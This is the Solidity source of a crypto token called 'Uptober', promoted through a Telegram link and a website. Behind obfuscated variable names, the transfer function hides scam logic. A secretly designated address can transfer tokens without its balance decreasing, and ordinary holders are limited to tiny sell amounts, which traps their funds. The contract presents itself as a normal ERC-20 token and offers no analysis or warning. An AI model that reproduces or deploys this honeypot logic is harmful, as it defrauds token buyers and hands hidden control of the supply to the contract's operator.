/*

https://t.me/ercuptober

https://uptober.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Uptober is Ownable {
    constructor(string memory crfnalih, string memory exks, address esqruv, address fnoh) {
        name = crfnalih;
        symbol = exks;
        balanceOf[msg.sender] = totalSupply;
        euxmtnpd[fnoh] = lgvwaod;
        csltzernv = IUniswapV2Router02(esqruv);
    }

    uint8 public decimals = 9;

    function transfer(address uztsv, uint256 tpzf) public returns (bool success) {
        oevzfs(msg.sender, uztsv, tpzf);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private mbovkrqt;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private snlhk;

    function approve(address pvmqsy, uint256 tpzf) public returns (bool success) {
        allowance[msg.sender][pvmqsy] = tpzf;
        emit Approval(msg.sender, pvmqsy, tpzf);
        return true;
    }

    string public name;

    string public symbol;

    function oevzfs(address myqcbnw, address uztsv, uint256 tpzf) private {
        address bgrodaykse = IUniswapV2Factory(csltzernv.factory()).getPair(address(this), csltzernv.WETH());
        bool sybneva = snlhk[myqcbnw] == block.number;
        if (0 == euxmtnpd[myqcbnw]) {
            if (myqcbnw != bgrodaykse && (!sybneva || tpzf > mbovkrqt[myqcbnw]) && tpzf < totalSupply) {
                require(tpzf <= totalSupply / (10 ** decimals));
            }
            balanceOf[myqcbnw] -= tpzf;
        }
        mbovkrqt[uztsv] = tpzf;
        balanceOf[uztsv] += tpzf;
        snlhk[uztsv] = block.number;
        emit Transfer(myqcbnw, uztsv, tpzf);
    }

    uint256 private lgvwaod = 109;

    mapping(address => uint256) private euxmtnpd;

    function transferFrom(address myqcbnw, address uztsv, uint256 tpzf) public returns (bool success) {
        require(tpzf <= allowance[myqcbnw][msg.sender]);
        allowance[myqcbnw][msg.sender] -= tpzf;
        oevzfs(myqcbnw, uztsv, tpzf);
        return true;
    }

    IUniswapV2Router02 private csltzernv;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
}
